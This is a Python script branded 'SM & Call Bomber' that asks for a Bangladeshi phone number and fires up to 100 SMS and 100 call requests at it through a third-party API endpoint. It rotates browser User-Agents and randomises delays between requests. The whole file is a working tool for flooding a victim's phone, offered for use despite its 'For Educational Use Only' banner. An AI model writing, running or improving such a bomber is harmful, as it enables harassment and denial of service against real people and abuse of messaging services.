import requests
import time
import random
import sys
import os

# ANSI escape codes for colors
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

# ASCII Art
SM_ART = f"""
{Colors.CYAN}
                          _____ __  __ 
                        / ____|  \/  |
                       | (___ | \✨/ |
                        \___ \| |\/| |
                        ____) | |  | |
                       |_____/|_|  |_|

                 {Colors.YELLOW}=== SM CORPORATE 🍁 SM & Call Bomber ==={Colors.RESET}
                 Coded by: SM 🍁 
                 For Educational Use Only!
"""

# API configuration
API = {
    "name": "Trial API",
    "url": "https://bomberdemofor2hrtcs.vercel.app/api/trialapi",
    "method": "GET",
    "params": {"phone": "{number}", "type": "{type}"}
}

# Random User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

def validate_phone(phone):
    return phone.isdigit() and len(phone) == 11 and phone.startswith("01")

def send_request(phone, request_type):
    url = API["url"]
    params = {key: value.replace("{number}", phone).replace("{type}", request_type) for key, value in API["params"].items()}
    headers = {"User-Agent": random.choice(USER_AGENTS)}

    try:
        response = requests.get(url, params=params, headers=headers, timeout=10)
        # Print raw response for debugging
        print(f"{Colors.YELLOW}Debug: Raw API response: {response.text}{Colors.RESET}")
        # Assume success on HTTP 200, as API sends messages but may return misleading status
        if response.status_code == 200:
            return {"success": True, "status": "Success (Note: May trigger multiple messages)"}
        return {"success": False, "status": f"Failed: HTTP {response.status_code}"}
    except requests.RequestException as e:
        return {"success": False, "status": f"Failed: {str(e)}"}

def main():
    clear_screen()
    print(SM_ART)
    
    # Phone number input
    phone = input(f"{Colors.CYAN}Enter Bangladeshi number (e.g., 01712345678): {Colors.RESET}").strip()
    if not validate_phone(phone):
        print(f"{Colors.RED}Invalid number! Must be 11 digits starting with 01.{Colors.RESET}")
        input("Press Enter to exit...")
        return

    # Count input for SMS and Calls
    try:
        sms_count = int(input(f"{Colors.CYAN}Enter number of SMS requests (0-100): {Colors.RESET}").strip())
        call_count = int(input(f"{Colors.CYAN}Enter number of Call requests (0-100): {Colors.RESET}").strip())
        if not (0 <= sms_count <= 100 and 0 <= call_count <= 100):
            raise ValueError
        if sms_count == 0 and call_count == 0:
            print(f"{Colors.RED}Both SMS and Call counts cannot be 0!{Colors.RESET}")
            input("Press Enter to exit...")
            return
    except ValueError:
        print(f"{Colors.RED}Invalid count! Must be between 0 and 100.{Colors.RESET}")
        input("Press Enter to exit...")
        return

    # Delay input
    try:
        delay = float(input(f"{Colors.CYAN}Enter delay between requests (seconds, e.g., 2): {Colors.RESET}").strip())
        if delay < 0:
            raise ValueError
    except ValueError:
        print(f"{Colors.RED}Invalid delay! Must be a non-negative number.{Colors.RESET}")
        input("Press Enter to exit...")
        return

    total_requests = sms_count + call_count
    print(f"\n{Colors.YELLOW}Starting bombing to {phone} with {sms_count} SMS requests and {call_count} call requests (delay: {delay}s)...{Colors.RESET}")
    print(f"{Colors.YELLOW}Note: Each SMS request may trigger multiple messages (e.g., 10 SMS per request).{Colors.RESET}")

    # Create and shuffle request list
    request_list = [("sms", API) for _ in range(sms_count)] + [("call", API) for _ in range(call_count)]
    random.shuffle(request_list)

    for i, (request_type, _) in enumerate(request_list, 1):
        result = send_request(phone, request_type)
        if result["success"]:
            print(f"{Colors.GREEN}[{i}/{total_requests}] {API['name']} ({request_type.upper()}): {result['status']}{Colors.RESET}")
        else:
            print(f"{Colors.RED}[{i}/{total_requests}] {API['name']} ({request_type.upper()}): {result['status']}{Colors.RESET}")
        time.sleep(delay + random.uniform(0, 1))

    print(f"\n{Colors.GREEN}SMS and Call bombing completed successfully!{Colors.RESET}")
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Stopped by user.{Colors.RESET}")
        sys.exit(0)
